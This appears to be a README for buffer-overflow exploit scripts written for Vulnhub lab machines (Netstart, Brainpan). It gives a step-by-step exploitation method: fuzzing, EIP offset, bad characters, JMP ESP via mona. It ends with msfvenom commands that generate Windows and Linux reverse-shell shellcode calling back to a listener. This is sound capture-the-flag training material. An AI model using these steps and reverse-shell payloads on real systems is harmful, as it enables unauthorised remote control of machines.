# Exploiting Stackbased Buffer Overflow
Python2 based Bufferoverflow scripts I developed while doing the box **Netsart** by **Foxlox** on **Vulnhub**.

**Walkthrough** link: https://grumpygeekwrites.wordpress.com/2020/12/07/netstart-vulnhub-walk-through-tutorial/

Also Works with: 
> 1. Brainpan Vulnhub (tested)
> 1. Dostackbufferoverflowgood (tested, remember to add "\n" at the end of buffer)

IMP steps to remember are:
> 1. Spiking.
> 1. Fuzzing / Crashing the program with some bytes.
> 1. Noting down those bytes.
> 1. Creating a unique pattern via MSF of those bytes length and sending it to the program.
> 1. Again crashing the program and noting down the value of EIP. 
> 1. Giving the EIP value to MSF offset for finding the exact crash point. 
> 1. Controlling EIP, to check whether our EIP is filled with 04 x B (EIP = 42 42 42 24)
> 1. Finding badchars, [follow ESP in dump] removing it from the BadChars array again and again. We should see neat and clean output from 0000-FFFF.
> 1. Finding the JMP address in ".dll" using mona. 
> 1. Use command01= !mona modules --- command02= !mona find -s ‘\xff\xe4’ -m login_support.dll. Note down all the addresses.
> 1. If mona fails, manually use SEARCH COMMAND and look for JMP ESP address. 
> 1. If there is no module (.dll) file use this command03 = !mona jmp -r esp -cpb "\x00"
> 1. Generating a SHELL payload using MSF Venom; remember to select proper architecture and specifying the BADCHARS we found. 
> 1. We should now get shell, our PAYLOAD would be something like ---> A*(offset value) + JMP Address in little endian format + 8/16/32 NOPs + shellcode

**Generate rev-shell for Windows**:
> 1. msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.100 LPORT=1234 EXITFUNC=thread –e x86/shikata_ga_nai -b "\x00\x2d\x2e\x46\x47\x59\x5e\x60" -f c

**Generate rev-shell for Linux**:
> 1. msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.10.6 LPORT=1234 EXITFUNC=thread -b "\x00\x2d\x2e\x46\x47\x59\x5e\x60" -f c
